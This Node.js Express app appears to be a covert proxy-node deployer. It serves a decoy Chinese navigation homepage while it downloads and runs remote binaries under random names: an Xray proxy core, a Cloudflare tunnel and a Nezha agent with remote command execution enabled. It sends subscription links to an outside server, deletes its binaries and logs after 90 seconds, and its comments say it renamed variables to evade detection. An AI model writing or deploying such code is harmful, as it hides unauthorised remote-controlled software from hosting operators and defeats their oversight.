const express = require("express");
const app = express();
const axios = require("axios");
const os = require('os');
const fs = require("fs");
const path = require("path");
const { promisify } = require('util');
const exec = promisify(require('child_process').exec);
const { execSync } = require('child_process');

// --- 核心变量配置 (重命名内部变量以降低特征) ---
// 注意：process.env 的 key 保持不变以兼容现有的部署环境变量
const SYNC_URL = process.env.UPLOAD_URL || '';      // 原 UPLOAD_URL
const APP_URL = process.env.PROJECT_URL || '';      // 原 PROJECT_URL
const AUTO_PING = process.env.AUTO_ACCESS || false; // 原 AUTO_ACCESS
const WORK_DIR = process.env.FILE_PATH || './tmp';  // 原 FILE_PATH
const FEED_PATH = process.env.SUB_PATH || 'sub';    // 原 SUB_PATH
const SVC_PORT = process.env.SERVER_PORT || process.env.PORT || 3000;
const USER_ID = process.env.UUID || '9afd1229-b893-40c1-84dd-51e7ce204913'; // 原 UUID

// --- 必须保留的特定服务变量 (未修改) ---
const NEZHA_SERVER = process.env.NEZHA_SERVER || '';
const NEZHA_PORT = process.env.NEZHA_PORT || '';
const NEZHA_KEY = process.env.NEZHA_KEY || '';
const ARGO_DOMAIN = process.env.ARGO_DOMAIN || '';
const ARGO_AUTH = process.env.ARGO_AUTH || '';
const ARGO_PORT = process.env.ARGO_PORT || 8001;

// --- 节点信息变量 (重命名内部引用) ---
const OPT_IP = process.env.CFIP || 'cdns.doon.eu.org'; // 原 CFIP
const OPT_PORT = process.env.CFPORT || 443;            // 原 CFPORT
const NODE_LABEL = process.env.NAME || '';             // 原 NAME

// --- 静态页面内容 (极简未来导航) ---
const HOME_PAGE = `
<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>极简未来导航</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://unpkg.com/lucide@latest"></script>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;600;700&display=swap');
        body { font-family: 'Plus Jakarta Sans', sans-serif; background-color: #f8fafc; background-image: radial-gradient(at 0% 0%, rgba(99, 102, 241, 0.1) 0px, transparent 50%), radial-gradient(at 100% 0%, rgba(168, 85, 247, 0.1) 0px, transparent 50%); }
        .glass-card { background: rgba(255, 255, 255, 0.7); backdrop-filter: blur(12px); border: 1px solid rgba(255, 255, 255, 0.3); transition: all 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275); }
        .glass-card:hover { background: rgba(255, 255, 255, 1); transform: translateY(-5px) scale(1.02); box-shadow: 0 20px 25px -5px rgba(0, 0, 0, 0.05), 0 10px 10px -5px rgba(0, 0, 0, 0.02); }
        .category-pill { transition: all 0.3s; }
        .category-pill.active { background: #4f46e5; color: white; box-shadow: 0 4px 12px rgba(79, 70, 229, 0.3); }
        .no-scrollbar::-webkit-scrollbar { display: none; }
        .no-scrollbar { -ms-overflow-style: none; scrollbar-width: none; }
    </style>
</head>
<body class="min-h-screen">
    <aside class="fixed left-0 top-0 h-screen w-64 bg-white/50 backdrop-blur-lg border-r border-gray-200 p-6 hidden lg:flex flex-col">
        <div class="flex items-center gap-3 mb-10 px-2">
            <div class="w-10 h-10 bg-indigo-600 rounded-xl flex items-center justify-center text-white shadow-lg shadow-indigo-200"><i data-lucide="compass" class="w-6 h-6"></i></div>
            <span class="text-xl font-bold tracking-tight text-gray-800">Nova Nav</span>
        </div>
        <nav class="space-y-2">
            <a href="#work" class="category-pill active flex items-center gap-3 px-4 py-3 rounded-xl text-gray-600 hover:bg-white hover:shadow-sm"><i data-lucide="briefcase" class="w-5 h-5"></i> <span class="font-medium">生产力</span></a>
            <a href="#design" class="category-pill flex items-center gap-3 px-4 py-3 rounded-xl text-gray-600 hover:bg-white hover:shadow-sm"><i data-lucide="palette" class="w-5 h-5"></i> <span class="font-medium">视觉设计</span></a>
            <a href="#dev" class="category-pill flex items-center gap-3 px-4 py-3 rounded-xl text-gray-600 hover:bg-white hover:shadow-sm"><i data-lucide="code-2" class="w-5 h-5"></i> <span class="font-medium">开发工具</span></a>
            <a href="#ai" class="category-pill flex items-center gap-3 px-4 py-3 rounded-xl text-gray-600 hover:bg-white hover:shadow-sm"><i data-lucide="sparkles" class="w-5 h-5"></i> <span class="font-medium">人工智能</span></a>
        </nav>
        <div class="mt-auto p-4 bg-indigo-50 rounded-2xl">
            <p class="text-xs text-indigo-600 font-semibold mb-1">今日箴言</p>
            <p class="text-xs text-indigo-400 italic">"Stay hungry, Stay foolish."</p>
        </div>
    </aside>
    <main class="lg:ml-64 p-4 md:p-8 lg:p-12">
        <div class="max-w-6xl mx-auto mb-12">
            <div class="flex flex-col md:flex-row md:items-center justify-between gap-6">
                <div><h2 id="greeting" class="text-3xl font-bold text-gray-800">下午好, 开发者</h2><p class="text-gray-500 mt-1">今天你想去哪里探索？</p></div>
                <div class="relative group">
                    <div class="absolute inset-y-0 left-0 pl-4 flex items-center pointer-events-none"><i data-lucide="search" class="h-5 w-5 text-gray-400 group-focus-within:text-indigo-500 transition-colors"></i></div>
                    <input type="text" id="searchInput" class="block w-full md:w-80 pl-11 pr-4 py-3 bg-white border-none rounded-2xl shadow-sm ring-1 ring-gray-200 focus:ring-2 focus:ring-indigo-500 transition-all outline-none" placeholder="快速查找 (按 / 聚焦)">
                    <div class="absolute right-3 top-3 px-1.5 py-0.5 border border-gray-200 rounded text-[10px] text-gray-400">/</div>
                </div>
            </div>
        </div>
        <div class="max-w-6xl mx-auto space-y-16">
            <section id="work">
                <div class="flex items-center gap-2 mb-6"><div class="h-6 w-1 bg-indigo-600 rounded-full"></div><h3 class="text-lg font-bold text-gray-800 tracking-wide uppercase">生产力工具</h3></div>
                <div class="grid grid-cols-1 sm:grid-cols-2 xl:grid-cols-3 gap-6">
                    <a href="#" class="nav-card glass-card p-5 rounded-3xl flex items-start gap-4"><div class="w-12 h-12 bg-blue-100 rounded-2xl flex-shrink-0 flex items-center justify-center text-blue-600"><i data-lucide="layers"></i></div><div class="overflow-hidden"><h4 class="font-bold text-gray-800 mb-1">Notion Workspace</h4><p class="text-sm text-gray-500 leading-relaxed line-clamp-2">全能笔记与项目协作平台</p></div></a>
                    <a href="#" class="nav-card glass-card p-5 rounded-3xl flex items-start gap-4"><div class="w-12 h-12 bg-orange-100 rounded-2xl flex-shrink-0 flex items-center justify-center text-orange-600"><i data-lucide="mail"></i></div><div><h4 class="font-bold text-gray-800 mb-1">Gmail</h4><p class="text-sm text-gray-500 leading-relaxed">处理日常最重要的沟通邮件</p></div></a>
                    <a href="#" class="nav-card glass-card p-5 rounded-3xl flex items-start gap-4"><div class="w-12 h-12 bg-green-100 rounded-2xl flex-shrink-0 flex items-center justify-center text-green-600"><i data-lucide="calendar"></i></div><div><h4 class="font-bold text-gray-800 mb-1">Google Calendar</h4><p class="text-sm text-gray-500 leading-relaxed">管理你的时间与日程安排</p></div></a>
                </div>
            </section>
            <section id="design">
                <div class="flex items-center gap-2 mb-6"><div class="h-6 w-1 bg-pink-600 rounded-full"></div><h3 class="text-lg font-bold text-gray-800 tracking-wide uppercase">视觉设计</h3></div>
                <div class="grid grid-cols-1 sm:grid-cols-2 xl:grid-cols-3 gap-6">
                    <a href="#" class="nav-card glass-card p-5 rounded-3xl flex items-start gap-4 border-b-4 border-b-pink-500/20"><div class="w-12 h-12 bg-pink-100 rounded-2xl flex-shrink-0 flex items-center justify-center text-pink-600"><i data-lucide="figma"></i></div><div><h4 class="font-bold text-gray-800 mb-1">Figma</h4><p class="text-sm text-gray-500">下一代界面设计协同工具</p></div></a>
                </div>
            </section>
        </div>
    </main>
    <script>
        lucide.createIcons();
        const hours = new Date().getHours();
        const greetingEl = document.getElementById('greeting');
        if (hours < 12) greetingEl.innerText = "早上好, 开发者"; else if (hours < 18) greetingEl.innerText = "下午好, 开发者"; else greetingEl.innerText = "晚上好, 开发者";
        const searchInput = document.getElementById('searchInput');
        const cards = document.querySelectorAll('.nav-card');
        searchInput.addEventListener('input', (e) => { const term = e.target.value.toLowerCase(); cards.forEach(card => { const text = card.innerText.toLowerCase(); card.style.display = text.includes(term) ? 'flex' : 'none'; }); });
        window.addEventListener('keydown', (e) => { if (e.key === '/') { e.preventDefault(); searchInput.focus(); } });
        const pills = document.querySelectorAll('.category-pill');
        pills.forEach(pill => { pill.addEventListener('click', () => { pills.forEach(p => p.classList.remove('active')); pill.classList.add('active'); }); });
    </script>
</body>
</html>
`;

// 初始化运行环境
if (!fs.existsSync(WORK_DIR)) {
  fs.mkdirSync(WORK_DIR);
  console.log(`${WORK_DIR} created`);
}

// 随机ID生成器
function getRandomId() {
  const chars = 'abcdefghijklmnopqrstuvwxyz';
  let str = '';
  for (let i = 0; i < 6; i++) {
    str += chars.charAt(Math.floor(Math.random() * chars.length));
  }
  return str;
}

// 进程与文件标识 (混淆化)
const execAgent = getRandomId(); // 原 npmName
const execCore = getRandomId();  // 原 webName
const execTunnel = getRandomId(); // 原 botName
const execMonitor = getRandomId(); // 原 phpName

// 路径定义
let agentPath = path.join(WORK_DIR, execAgent);
let monitorPath = path.join(WORK_DIR, execMonitor);
let corePath = path.join(WORK_DIR, execCore);
let tunnelPath = path.join(WORK_DIR, execTunnel);

// 修改：将 'sub.txt' 改为 'cache.dat', 'boot.log' 改为 'runtime.log'
let cacheFile = path.join(WORK_DIR, 'cache.dat'); 
let listFile = path.join(WORK_DIR, 'list.txt');
let logFile = path.join(WORK_DIR, 'runtime.log');
let confFile = path.join(WORK_DIR, 'info.json'); // 原 config.json

// 清理旧实例
function flushLegacy() {
  try {
    if (!SYNC_URL) return;
    if (!fs.existsSync(cacheFile)) return;

    let content;
    try {
      content = fs.readFileSync(cacheFile, 'utf-8');
    } catch { return null; }

    const raw = Buffer.from(content, 'base64').toString('utf-8');
    const nodes = raw.split('\n').filter(l => 
      /(vless|vmess|trojan|hysteria2|tuic):\/\//.test(l)
    );

    if (nodes.length === 0) return;

    axios.post(`${SYNC_URL}/api/delete-nodes`, 
      JSON.stringify({ nodes }),
      { headers: { 'Content-Type': 'application/json' } }
    ).catch(() => {});
    return null;
  } catch (e) { return null; }
}

function sweepWorkDir() {
  try {
    const files = fs.readdirSync(WORK_DIR);
    files.forEach(f => {
      try {
        const fp = path.join(WORK_DIR, f);
        if (fs.statSync(fp).isFile()) fs.unlinkSync(fp);
      } catch {}
    });
  } catch {}
}

// --- 主路由 (修改点：返回 HTML) ---
app.get("/", function(req, res) {
  res.send(HOME_PAGE);
});

// 配置生成器 (原 generateConfig)
async function setupCore() {
  const conf = {
    log: { access: '/dev/null', error: '/dev/null', loglevel: 'none' },
    inbounds: [
      { port: ARGO_PORT, protocol: 'vless', settings: { clients: [{ id: USER_ID, flow: 'xtls-rprx-vision' }], decryption: 'none', fallbacks: [{ dest: 3001 }, { path: "/vless-argo", dest: 3002 }, { path: "/vmess-argo", dest: 3003 }, { path: "/trojan-argo", dest: 3004 }] }, streamSettings: { network: 'tcp' } },
      { port: 3001, listen: "127.0.0.1", protocol: "vless", settings: { clients: [{ id: USER_ID }], decryption: "none" }, streamSettings: { network: "tcp", security: "none" } },
      { port: 3002, listen: "127.0.0.1", protocol: "vless", settings: { clients: [{ id: USER_ID, level: 0 }], decryption: "none" }, streamSettings: { network: "ws", security: "none", wsSettings: { path: "/vless-argo" } }, sniffing: { enabled: true, destOverride: ["http", "tls", "quic"], metadataOnly: false } },
      { port: 3003, listen: "127.0.0.1", protocol: "vmess", settings: { clients: [{ id: USER_ID, alterId: 0 }] }, streamSettings: { network: "ws", wsSettings: { path: "/vmess-argo" } }, sniffing: { enabled: true, destOverride: ["http", "tls", "quic"], metadataOnly: false } },
      { port: 3004, listen: "127.0.0.1", protocol: "trojan", settings: { clients: [{ password: USER_ID }] }, streamSettings: { network: "ws", security: "none", wsSettings: { path: "/trojan-argo" } }, sniffing: { enabled: true, destOverride: ["http", "tls", "quic"], metadataOnly: false } },
    ],
    dns: { servers: ["https+local://8.8.8.8/dns-query"] },
    outbounds: [ { protocol: "freedom", tag: "direct" }, {protocol: "blackhole", tag: "block"} ]
  };
  fs.writeFileSync(confFile, JSON.stringify(conf, null, 2));
}

function checkArch() {
  const arch = os.arch();
  return (arch === 'arm' || arch === 'arm64' || arch === 'aarch64') ? 'arm' : 'amd';
}

function fetchBin(name, url, cb) {
  const target = name;
  if (!fs.existsSync(WORK_DIR)) fs.mkdirSync(WORK_DIR, { recursive: true });
  
  const w = fs.createWriteStream(target);
  axios({ method: 'get', url: url, responseType: 'stream' })
    .then(resp => {
      resp.data.pipe(w);
      w.on('finish', () => { w.close(); cb(null, target); });
      w.on('error', err => { fs.unlink(target, () => {}); cb(err.message); });
    })
    .catch(err => cb(err.message));
}

// 资源获取与执行 (原 downloadFilesAndRun)
async function bootstrap() {  
  const arch = checkArch();
  const resources = getResources(arch);

  if (!resources.length) return;

  const tasks = resources.map(r => {
    return new Promise((resolve, reject) => {
      fetchBin(r.fileName, r.fileUrl, (err, p) => err ? reject(err) : resolve(p));
    });
  });

  try {
    await Promise.all(tasks);
  } catch (err) {
    console.error('Resource fetch error:', err);
    return;
  }

  function setPerms(paths) {
    paths.forEach(p => {
      if (fs.existsSync(p)) fs.chmod(p, 0o775, () => {});
    });
  }
  const bins = NEZHA_PORT ? [agentPath, corePath, tunnelPath] : [monitorPath, corePath, tunnelPath];
  setPerms(bins);

  // 启动监控 (Nezha)
  if (NEZHA_SERVER && NEZHA_KEY) {
    if (!NEZHA_PORT) {
      // V1 Agent 模式
      const port = NEZHA_SERVER.includes(':') ? NEZHA_SERVER.split(':').pop() : '';
      const secure = ['443', '8443', '2096', '2087', '2083', '2053'].includes(port) ? 'true' : 'false';
      
      const yml = `
client_secret: ${NEZHA_KEY}
debug: false
disable_auto_update: true
disable_command_execute: false
disable_force_update: true
disable_nat: false
disable_send_query: false
gpu: false
insecure_tls: true
ip_report_period: 1800
report_delay: 4
server: ${NEZHA_SERVER}
skip_connection_count: true
skip_procs_count: true
temperature: false
tls: ${secure}
use_gitee_to_upgrade: false
use_ipv6_country_code: false
uuid: ${USER_ID}`;
      
      fs.writeFileSync(path.join(WORK_DIR, 'config.yaml'), yml);
      try {
        await exec(`nohup ${monitorPath} -c "${WORK_DIR}/config.yaml" >/dev/null 2>&1 &`);
        await new Promise(r => setTimeout(r, 1000));
      } catch {}
    } else {
      // V0 Agent 模式
      let tlsFlag = '';
      if (['443', '8443', '2096', '2087', '2083', '2053'].includes(NEZHA_PORT)) tlsFlag = '--tls';
      try {
        await exec(`nohup ${agentPath} -s ${NEZHA_SERVER}:${NEZHA_PORT} -p ${NEZHA_KEY} ${tlsFlag} --disable-auto-update --report-delay 4 --skip-conn --skip-procs >/dev/null 2>&1 &`);
        await new Promise(r => setTimeout(r, 1000));
      } catch {}
    }
  }

  // 启动核心 (Xray/Core)
  try {
    await exec(`nohup ${corePath} -c ${confFile} >/dev/null 2>&1 &`);
    await new Promise(r => setTimeout(r, 1000));
  } catch {}

  // 启动隧道 (Argo)
  if (fs.existsSync(tunnelPath)) {
    let args;
    if (ARGO_AUTH.match(/^[A-Z0-9a-z=]{120,250}$/)) {
      args = `tunnel --edge-ip-version auto --no-autoupdate --protocol http2 run --token ${ARGO_AUTH}`;
    } else if (ARGO_AUTH.match(/TunnelSecret/)) {
      args = `tunnel --edge-ip-version auto --config ${WORK_DIR}/tunnel.yml run`;
    } else {
      args = `tunnel --edge-ip-version auto --no-autoupdate --protocol http2 --logfile ${logFile} --loglevel info --url http://localhost:${ARGO_PORT}`;
    }

    try {
      await exec(`nohup ${tunnelPath} ${args} >/dev/null 2>&1 &`);
      await new Promise(r => setTimeout(r, 2000));
    } catch {}
  }
  await new Promise(r => setTimeout(r, 5000));
}

function getResources(arch) {
  let list;
  const baseUrl = "https://amd64.ssss.nyc.mn"; // 默认 amd
  const armUrl = "https://arm64.ssss.nyc.mn";
  
  if (arch === 'arm') {
    list = [
      { fileName: corePath, fileUrl: `${armUrl}/web` },
      { fileName: tunnelPath, fileUrl: `${armUrl}/bot` }
    ];
  } else {
    list = [
      { fileName: corePath, fileUrl: `${baseUrl}/web` },
      { fileName: tunnelPath, fileUrl: `${baseUrl}/bot` }
    ];
  }

  if (NEZHA_SERVER && NEZHA_KEY) {
    if (NEZHA_PORT) {
      const url = arch === 'arm' ? `${armUrl}/agent` : `${baseUrl}/agent`;
      list.unshift({ fileName: agentPath, fileUrl: url });
    } else {
      const url = arch === 'arm' ? `${armUrl}/v1` : `${baseUrl}/v1`;
      list.unshift({ fileName: monitorPath, fileUrl: url });
    }
  }
  return list;
}

function setupTunnelConf() {
  if (!ARGO_AUTH || !ARGO_DOMAIN) return;

  if (ARGO_AUTH.includes('TunnelSecret')) {
    fs.writeFileSync(path.join(WORK_DIR, 'tunnel.json'), ARGO_AUTH);
    const yml = `
  tunnel: ${ARGO_AUTH.split('"')[11]}
  credentials-file: ${path.join(WORK_DIR, 'tunnel.json')}
  protocol: http2
  ingress:
    - hostname: ${ARGO_DOMAIN}
      service: http://localhost:${ARGO_PORT}
      originRequest:
        noTLSVerify: true
    - service: http_status:404
  `;
    fs.writeFileSync(path.join(WORK_DIR, 'tunnel.yml'), yml);
  }
}

// 域名解析 (原 extractDomains)
async function resolveDomains() {
  let dom;

  if (ARGO_AUTH && ARGO_DOMAIN) {
    dom = ARGO_DOMAIN;
    await buildFeed(dom);
  } else {
    try {
      const content = fs.readFileSync(logFile, 'utf-8');
      const m = content.match(/https?:\/\/([^ ]*trycloudflare\.com)\/?/);
      
      if (m && m[1]) {
        dom = m[1];
        await buildFeed(dom);
      } else {
        fs.unlinkSync(logFile);
        // 简化的进程查杀
        const killCmd = process.platform === 'win32' 
          ? `taskkill /f /im ${execTunnel}.exe > nul 2>&1`
          : `pkill -f ${execTunnel} > /dev/null 2>&1`;
        
        try { await exec(killCmd); } catch {}
        
        await new Promise(r => setTimeout(r, 3000));
        const args = `tunnel --edge-ip-version auto --no-autoupdate --protocol http2 --logfile ${logFile} --loglevel info --url http://localhost:${ARGO_PORT}`;
        try {
          await exec(`nohup ${tunnelPath} ${args} >/dev/null 2>&1 &`);
          await new Promise(r => setTimeout(r, 3000));
          await resolveDomains();
        } catch {}
      }
    } catch {}
  }
}

async function getRegion() {
  try {
    const r = await axios.get('https://ipapi.co/json/', { timeout: 3000 });
    if (r.data?.country_code && r.data?.org) return `${r.data.country_code}_${r.data.org}`;
  } catch {
      try {
        const r2 = await axios.get('http://ip-api.com/json/', { timeout: 3000 });
        if (r2.data?.status === 'success') return `${r2.data.countryCode}_${r2.data.org}`;
      } catch {}
  }
  return 'Unknown';
}

// 订阅生成 (原 generateLinks)
async function buildFeed(dom) {
  const region = await getRegion();
  const label = NODE_LABEL ? `${NODE_LABEL}-${region}` : region;
  
  return new Promise((resolve) => {
    setTimeout(() => {
      const meta = { v: '2', ps: `${label}`, add: OPT_IP, port: OPT_PORT, id: USER_ID, aid: '0', scy: 'none', net: 'ws', type: 'none', host: dom, path: '/vmess-argo?ed=2560', tls: 'tls', sni: dom, alpn: '', fp: 'firefox'};
      const feed = `
vless://${USER_ID}@${OPT_IP}:${OPT_PORT}?encryption=none&security=tls&sni=${dom}&fp=firefox&type=ws&host=${dom}&path=%2Fvless-argo%3Fed%3D2560#${label}

vmess://${Buffer.from(JSON.stringify(meta)).toString('base64')}

trojan://${USER_ID}@${OPT_IP}:${OPT_PORT}?security=tls&sni=${dom}&fp=firefox&type=ws&host=${dom}&path=%2Ftrojan-argo%3Fed%3D2560#${label}
    `;
      
      console.log(Buffer.from(feed).toString('base64'));
      fs.writeFileSync(cacheFile, Buffer.from(feed).toString('base64'));
      
      syncData(); // 触发上传

      app.get(`/${FEED_PATH}`, (req, res) => {
        res.set('Content-Type', 'text/plain; charset=utf-8');
        res.send(Buffer.from(feed).toString('base64'));
      });
      resolve(feed);
      }, 2000);
    });
}

// 数据同步 (原 uploadNodes)
async function syncData() {
  if (SYNC_URL && APP_URL) {
    const subUrl = `${APP_URL}/${FEED_PATH}`;
    try {
        await axios.post(`${SYNC_URL}/api/add-subscriptions`, { subscription: [subUrl] }, { headers: { 'Content-Type': 'application/json' } });
    } catch {}
  } else if (SYNC_URL) {
      if (!fs.existsSync(listFile)) return;
      const raw = fs.readFileSync(listFile, 'utf-8');
      const nodes = raw.split('\n').filter(l => /(vless|vmess|trojan|hysteria2|tuic):\/\//.test(l));
      if (!nodes.length) return;

      try {
          await axios.post(`${SYNC_URL}/api/add-nodes`, JSON.stringify({ nodes }), { headers: { 'Content-Type': 'application/json' } });
      } catch {}
  }
}

// 痕迹清理
function purge() {
  setTimeout(() => {
    const targets = [logFile, confFile, corePath, tunnelPath];  
    if (NEZHA_PORT) targets.push(agentPath);
    else if (NEZHA_SERVER && NEZHA_KEY) targets.push(monitorPath);

    const cmd = process.platform === 'win32' 
      ? `del /f /q ${targets.join(' ')} > nul 2>&1`
      : `rm -rf ${targets.join(' ')} >/dev/null 2>&1`;
      
    exec(cmd, () => {
        console.clear();
        console.log('Service active');
    });
  }, 90000);
}
purge();

async function keepAlive() {
  if (!AUTO_PING || !APP_URL) return;
  try {
    await axios.post('https://oooo.serv00.net/add-url', { url: APP_URL }, { headers: { 'Content-Type': 'application/json' } });
  } catch {}
}

// 初始化入口
async function initService() {
  try {
    setupTunnelConf();
    flushLegacy();
    sweepWorkDir();
    await setupCore();
    await bootstrap();
    await resolveDomains();
    await keepAlive();
  } catch (e) {
    console.error('Init error:', e);
  }
}

initService().catch(() => {});
app.listen(SVC_PORT, () => console.log(`Service port:${SVC_PORT}`));
